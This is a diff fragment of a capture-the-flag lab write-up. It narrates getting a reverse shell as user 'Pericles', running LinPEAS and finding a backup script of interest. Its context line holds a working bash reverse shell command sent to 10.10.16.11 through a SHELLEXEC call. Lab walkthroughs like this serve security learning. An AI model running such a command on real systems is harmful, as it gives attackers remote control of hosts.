@@ -91,10 +91,21 @@ CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
 
 > * We got reverse shell successfully.
 
+> * Now i'm Pericles user.
 
-![]()
-![]()
-![]()
+![](https://i.ibb.co/XjnTN1D/image.png)
+
+> **I spent a day enumerating this box and i lost alot of Time as its name, But no thing useful So i decided the next day to use LinPEAS, it's a Tool to automate the enumeration process.**
+
+
+![](https://i.ibb.co/fpZ92df/image.png)
+
+
+![](https://i.ibb.co/hfJzCL3/image.png)
+
+**I found that intersting file to check ``` /usr/bin/timer_backup.sh ```
+
+
 ![]()
 ![]()
 ![]()
